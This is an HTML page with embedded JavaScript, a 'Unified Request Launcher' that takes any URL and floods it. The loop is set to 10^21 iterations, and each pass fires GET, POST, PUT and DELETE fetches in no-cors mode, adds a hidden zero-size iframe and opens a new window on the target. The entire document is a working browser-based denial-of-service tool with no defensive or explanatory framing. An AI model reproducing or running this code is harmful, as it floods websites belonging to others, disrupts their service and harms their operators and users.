<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Unified Request Launcher</title>
</head>
<body>
  <h2>Request a Website</h2>
  <input id="urlInput" type="text" placeholder="Enter full URL (https://...)">
  <button onclick="sendAll()">Send All</button>
  <div id="status"></div>

  <script>
    // Hard-coded knob: change this number directly in the code
    const REQUEST_COUNT = 1000000000000000000000; // how many times each type of request is sent

    function sendAll() {
      const url = document.getElementById('urlInput').value.trim();
      if (!url) {
        document.getElementById('status').textContent = "Please enter a URL.";
        return;
      }

      let total = REQUEST_COUNT * 6; // GET, POST, PUT, DELETE, iframe, window.open
      let sent = 0;

      function updateStatus() {
        document.getElementById('status').textContent =
          `Triggered ${sent}/${total} requests to ${url}`;
      }

      for (let i = 0; i < REQUEST_COUNT; i++) {
        // HTTP requests
        fetch(url, { method: 'GET', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
        fetch(url, { method: 'POST', body: JSON.stringify({ test: "post" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
        fetch(url, { method: 'PUT', body: JSON.stringify({ test: "put" }), headers: { "Content-Type": "application/json" }, mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });
        fetch(url, { method: 'DELETE', mode: 'no-cors' }).finally(() => { sent++; updateStatus(); });

        // Web requests (visible loads)
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.width = "0";
        iframe.style.height = "0";
        iframe.style.border = "none";
        document.body.appendChild(iframe);
        sent++; updateStatus();

        window.open(url, "_blank");
        sent++; updateStatus();
      }
    }
  </script>
</body>
</html>
